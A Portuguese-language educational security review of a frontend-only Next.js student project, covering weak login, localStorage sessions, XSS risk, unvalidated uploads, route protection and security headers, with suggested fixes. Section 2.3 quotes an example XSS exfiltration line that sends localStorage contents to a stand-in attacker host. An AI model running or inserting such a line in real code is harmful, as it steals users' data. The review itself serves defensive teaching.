# Análise de Segurança — HappyGame

> **Contexto:** Projeto acadêmico em fase inicial. Frontend-only com Next.js 16 + React 19. Toda persistência é feita via `localStorage` do navegador. Sem backend, sem banco de dados real, sem usuários reais.
>
> Esta análise tem **fins educacionais**: identificar riscos, explicar o porquê de cada um e sugerir melhorias simples caso o projeto evolua para produção.

---

## 1. Sumário Executivo

| Categoria | Risco Atual | Risco em Produção |
|---|---|---|
| Autenticação | Inexistente | Crítico |
| Armazenamento de dados | Baixo (só local) | Alto |
| XSS (Cross-Site Scripting) | Médio | Crítico |
| Upload de arquivos | Baixo | Alto |
| Proteção de rotas | Inexistente | Alto |
| Dependências desatualizadas | Baixo | Médio |
| Exposição de informações | Baixo | Médio |

---

## 2. Vulnerabilidades Identificadas

### 2.1 — Autenticação sem senha

**Arquivo:** `src/app/login/page.jsx`

**O que acontece:**
```jsx
// Só verifica se o campo não está vazio
if (!usuario.trim()) {
  alert("Por favor, insira um nome de usuário.");
  return;
}
localStorage.setItem("usuario", usuario);
router.push("/perfil");
```

Qualquer string que não seja vazia concede "acesso". Não há senha, não há verificação de identidade.

**Risco em produção:** Qualquer pessoa pode logar como qualquer outro usuário apenas digitando o nome. Dados de outros usuários ficam totalmente expostos.

**Como melhorar (simples):**
- Adicionar um campo de senha e validar contra valores pré-definidos (mesmo que hardcoded, para fins de estudo).
- Em produção real: usar JWT ou sessions com backend + hashing (bcrypt).

---

### 2.2 — XSS (Cross-Site Scripting) via conteúdo do Feed

**Arquivo:** `src/app/page.jsx`

**O que acontece:**

O usuário digita livremente no textarea e o texto é exibido na tela diretamente pelo React. Em teoria, o React faz escaping automático ao usar `{variavel}` em JSX, o que é uma proteção nativa boa.

**Porém, o risco existe se:**
- Em algum ponto futuro for usado `dangerouslySetInnerHTML` para renderizar markdown, emojis ou formatação rica.
- Algum dado do `localStorage` for injetado via `innerHTML` em código vanilla JS.

**Exemplo do que NÃO fazer:**
```jsx
// PERIGOSO — nunca faça isso com input do usuário
<div dangerouslySetInnerHTML={{ __html: texto }} />
```

**Exemplo do que é feito atualmente (seguro):**
```jsx
// Seguro — React escapa automaticamente
<p>{post.texto}</p>
```

**Risco em produção:** Se a aplicação evoluir para renderizar HTML rico (ex: suporte a links, negrito, markdown), XSS se torna crítico. Um atacante poderia injetar `<script>alert('XSS')</script>` ou roubar cookies/localStorage de outros usuários.

**Como melhorar:**
- Nunca usar `dangerouslySetInnerHTML` com input não sanitizado.
- Se precisar renderizar HTML, usar uma biblioteca de sanitização como [DOMPurify](https://github.com/cure53/DOMPurify).

---

### 2.3 — localStorage como único mecanismo de "sessão"

**Arquivos:** Todos os componentes que usam `localStorage`

**O que acontece:**
```jsx
// "Autenticação" baseada apenas em localStorage
const usuario = localStorage.getItem("usuario");
```

`localStorage` é acessível por **qualquer JavaScript rodando na mesma origem**. Isso significa que um ataque XSS bem-sucedido pode ler, modificar ou apagar todos os dados do usuário.

Além disso, `localStorage` não tem expiração — o "login" dura para sempre até o usuário limpar manualmente ou clicar em "Sair".

**Risco em produção:** Se houver um XSS, o atacante executa:
```js
// Roubo completo de dados do usuário
fetch('https://atacante.com/steal?d=' + JSON.stringify(localStorage));
```

**Como melhorar:**
- Para sessões reais: usar cookies `HttpOnly` + `Secure` (não acessíveis por JS).
- Adicionar expiração de sessão por tempo (ex: invalidar após 24h).
- Em produção, nunca armazenar tokens de autenticação em `localStorage`.

---

### 2.4 — Upload de arquivos sem validação

**Arquivo:** `src/app/perfil/page.jsx`

**O que acontece:**
```jsx
const reader = new FileReader();
reader.onloadend = () => {
  localStorage.setItem("foto", reader.result); // base64 sem verificação
};
reader.readAsDataURL(file);
```

Não há verificação de:
- Tipo MIME real do arquivo (só o que o navegador relata)
- Tamanho máximo
- Conteúdo do arquivo

**Risco em produção:** Em um sistema real com backend, um upload sem validação pode levar a:
- **Armazenamento de arquivos maliciosos** (web shells, scripts)
- **DoS por arquivos grandes** (esgotamento de disco/memória)
- **Bypass de restrições** (renomear `.php` para `.jpg`)

No contexto atual (base64 em localStorage), o risco imediato é menor, mas pode causar **degradação de performance** se o usuário fizer upload de uma imagem de 10MB — o localStorage tem limite de ~5MB por origem.

**Como melhorar:**
```jsx
const MAX_SIZE = 2 * 1024 * 1024; // 2MB
const TIPOS_ACEITOS = ['image/jpeg', 'image/png', 'image/webp'];

if (!TIPOS_ACEITOS.includes(file.type)) {
  alert("Apenas imagens JPG, PNG e WebP são aceitas.");
  return;
}
if (file.size > MAX_SIZE) {
  alert("Arquivo muito grande. Máximo: 2MB.");
  return;
}
```

---

### 2.5 — Ausência de proteção de rotas

**Arquivo:** `src/components/Nav.jsx` e todas as páginas

**O que acontece:**

Nenhuma rota verifica se o usuário está "autenticado" antes de renderizar. O único "portão" é o campo de username no `/login`, mas todas as outras rotas são livremente acessíveis digitando a URL.

```
localhost:3000/perfil       → acessa sem login
localhost:3000/configuracoes → acessa sem login
localhost:3000/eventos      → acessa sem login
```

**Risco em produção:** Sem proteção de rotas, qualquer rota que exiba ou manipule dados sensíveis é completamente pública.

**Como melhorar (simples com Next.js App Router):**

Criar um componente wrapper ou usar middleware:

```jsx
// src/middleware.js
import { NextResponse } from 'next/server';

export function middleware(request) {
  // Em produção real, verificar um cookie HttpOnly
  // Para fins de estudo, pode-se verificar um cookie simples
  const usuario = request.cookies.get('usuario');
  const rotasProtegidas = ['/perfil', '/configuracoes', '/eventos'];

  const rota = request.nextUrl.pathname;
  if (rotasProtegidas.includes(rota) && !usuario) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}
```

---

### 2.6 — Ausência de Content Security Policy (CSP)

**Arquivo:** `src/app/layout.jsx` / `next.config.mjs`

**O que acontece:**

Nenhum cabeçalho HTTP de segurança está configurado. O `next.config.mjs` está vazio.

**O que é CSP:** Uma política que diz ao navegador quais origens são confiáveis para carregar scripts, estilos, imagens etc. Mitiga XSS mesmo que ocorra.

**Como melhorar:**

```js
// next.config.mjs
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'X-Frame-Options',
            value: 'DENY', // Previne clickjacking
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff', // Previne MIME sniffing
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};
export default nextConfig;
```

---

### 2.7 — Dependências com versões potencialmente vulneráveis

**Arquivo:** `package.json`

```json
"next": "16.0.6",       // Versão recente — ok
"react": "19.2.0",      // Versão recente — ok
"chart.js": "^4.5.1"    // Verificar CVEs
```

**Como verificar:**
```bash
npm audit
```

**Boa prática:** Rodar `npm audit` periodicamente e atualizar dependências com:
```bash
npm audit fix
```

---

### 2.8 — Dados sensíveis no histórico de navegação

**Arquivo:** `src/app/login/page.jsx`

**O que acontece:**
```jsx
router.push("/perfil"); // após login
```

O nome de usuário pode aparecer em URLs se houver algum query param, e o histórico de navegação do browser fica com o fluxo de login visível.

**Risco:** Em ambientes compartilhados (lan houses, computadores públicos), o histórico pode expor informações.

**Como melhorar:**
- Usar `router.replace("/perfil")` ao invés de `router.push()` para não adicionar a página de login ao histórico de navegação.

---

## 3. O que o projeto faz BEM (do ponto de vista de segurança)

| Ponto positivo | Explicação |
|---|---|
| React faz escaping automático | `{variavel}` em JSX nunca renderiza HTML cru |
| Sem backend exposto | Não há APIs públicas que possam ser abusadas |
| Sem credenciais no código-fonte | Nenhuma chave de API ou senha hardcoded encontrada |
| Validação básica de campos | Previne submissão de formulários completamente vazios |
| localStorage.clear() no logout | Limpa todos os dados ao sair |

---

## 4. Prioridade de Melhorias

Se o projeto evoluir para produção, seguir esta ordem:

| Prioridade | Melhoria | Complexidade |
|---|---|---|
| 🔴 Alta | Autenticação real com senha + backend | Alta |
| 🔴 Alta | Proteção de rotas (middleware) | Baixa |
| 🟠 Média | Validação e limite de upload de arquivos | Baixa |
| 🟠 Média | Cabeçalhos HTTP de segurança (CSP) | Baixa |
| 🟡 Baixa | `router.replace` no login | Muito baixa |
| 🟡 Baixa | Auditoria periódica de dependências | Muito baixa |

---

## 5. Conceitos Aprendidos nesta Análise

| Conceito | O que é |
|---|---|
| **XSS** | Injeção de scripts maliciosos via input do usuário |
| **CSRF** | Forjar requisições em nome de um usuário autenticado |
| **CSP** | Política que restringe origens de recursos no browser |
| **HttpOnly Cookie** | Cookie inacessível por JavaScript (proteção contra XSS) |
| **Sanitização** | Limpar/neutralizar input do usuário antes de renderizar |
| **MIME Sniffing** | Browser tenta "adivinhar" o tipo de um arquivo — pode ser explorado |
| **Clickjacking** | Sobrepor um iframe invisível sobre a página para enganar o usuário |

---

## 6. Conclusão

Para um projeto acadêmico em fase inicial, **sem banco de dados real e sem usuários reais**, o nível de risco atual é **baixo**. O maior risco concreto hoje é a ausência de validação no upload de arquivos, que pode esgotar o `localStorage`.

Os riscos **críticos** surgiriam se o projeto:
1. Adicionasse um backend com banco de dados real
2. Tivesse usuários reais cadastrados
3. Fosse exposto na internet

Nesse caso, as prioridades da seção 4 se tornariam obrigatórias, especialmente autenticação real e proteção de rotas.

---

*Análise gerada em 2026-03-23 | Stack: Next.js 16 + React 19 + Tailwind CSS 4 | Escopo: frontend-only*
